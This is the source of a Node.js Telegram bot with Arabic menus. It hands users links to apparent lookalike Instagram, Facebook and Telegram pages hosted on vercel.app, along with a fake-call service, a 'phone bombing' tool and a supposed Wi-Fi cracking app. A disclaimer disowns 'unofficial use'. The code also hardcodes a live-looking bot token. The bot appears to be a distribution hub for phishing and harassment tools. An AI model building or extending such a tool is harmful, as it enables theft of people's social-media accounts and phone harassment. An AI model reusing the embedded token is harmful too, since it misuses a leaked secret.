const TelegramBot = require("node-telegram-bot-api");

const TOKEN = process.env.BOT_TOKEN || "8926452536:AAGMA0SDtBfYCbAVg_4EZCwkj1sw5-p-OfQ";

const bot = new TelegramBot(TOKEN, {
  polling: true,
});

console.log("✅ Bot is running...");

const acceptedUsers = new Set();

function sendMainMenu(chatId) {
  return bot.sendMessage(
    chatId,
    "👋 أهلاً بك\n\nاختر المنصة:",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📸 Instagram", callback_data: "instagram" },
            { text: "📘 Facebook", callback_data: "facebook" }
          ],
          [
            { text: "✈️ Telegram", callback_data: "telegram" },
            { text: "اتصال وهمي", callback_data: "twitter" }
          ],
          [
            { text: "💬 تفجير هواتف", callback_data: "تفجير هواتف" },
            { text: "تطبيق فك جميع شبكات النت", callback_data: "whatsapp" }
          ]
        ]
      }
    }
  );
}


// ==========================
// /start
// ==========================
bot.onText(/^\/start(?:\s+(.+))?$/, async (msg) => {

  const chatId = msg.chat.id;

  const firstName = msg.from?.first_name || "غير معروف";
  const lastName = msg.from?.last_name || "";
  const username = msg.from?.username
    ? `@${msg.from.username}`
    : "لا يوجد";

  const fullName = `${firstName} ${lastName}`.trim();

  // إذا وافق سابقًا
  if (acceptedUsers.has(chatId)) {
    return sendMainMenu(chatId);
  }

  await bot.sendMessage(
    chatId,
    `👋 أهلاً بك ${fullName}

🆔 معرف Telegram الخاص بك:
${chatId}

👤 Username:
${username}

📋 شروط استخدام البوت:

أنا غير مسؤول عن أي استخدام غير رسمي للبوت.

باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "✅ أوافق على الشروط",
              callback_data: "accept_terms"
            }
          ]
        ]
      }
    }
  );
});


// ==========================
// Callback buttons
// ==========================
bot.on("callback_query", async (query) => {

  const chatId = query.message.chat.id;

  try {

    // ======================
    // قبول الشروط
    // ======================
    if (query.data === "accept_terms") {

      acceptedUsers.add(chatId);

      await bot.answerCallbackQuery(query.id, {
        text: "تم قبول الشروط ✅"
      });

      await bot.sendMessage(
        chatId,
        `✅ تم قبول الشروط.

أهلاً بك ${query.from.first_name || ""}.

🆔 ID الخاص بك:
${chatId}

اضغط /start للمتابعة إلى القائمة الرئيسية.`
      );

      return;
    }


    // ======================
    // باقي الأزرار
    // ======================

    if (!acceptedUsers.has(chatId)) {

      await bot.answerCallbackQuery(query.id, {
        text: "يجب الموافقة على الشروط أولاً."
      });

      return;
    }


    switch (query.data) {

      case "instagram":
        await bot.sendMessage(
          chatId,
          "📸 Instagram\nhttps://instagram-two-henna.vercel.app/"
        );
        break;

      case "facebook":
        await bot.sendMessage(
          chatId,
          "📘 Facebook\nhttps://facebook-ruby-one.vercel.app/"
        );
        break;

      case "telegram":
        await bot.sendMessage(
          chatId,
          "✈️ Telegram\nhttps://telegram-one-rho.vercel.app/"
        );
        break;

      case "twitter":
        await bot.sendMessage(
          chatId,
          "📞 اتصال وهمي\nhttps://callmyphone.org/"
        );
        break;

      case "whatsapp":
        await bot.sendMessage(
          chatId,
          "📶 تطبيق فك جميع شبكات Wi-Fi\nhttps://wifi-free-gamma.vercel.app/"
        );
        break;

      case "تفجير هواتف":
        await bot.sendMessage(
          chatId,
          "💬 تفجير هواتف\nhttps://kexart.com/"
        );
        break;
    }

    await bot.answerCallbackQuery(query.id);

  } catch (error) {

    console.error("❌ Error:", error);

  }
});
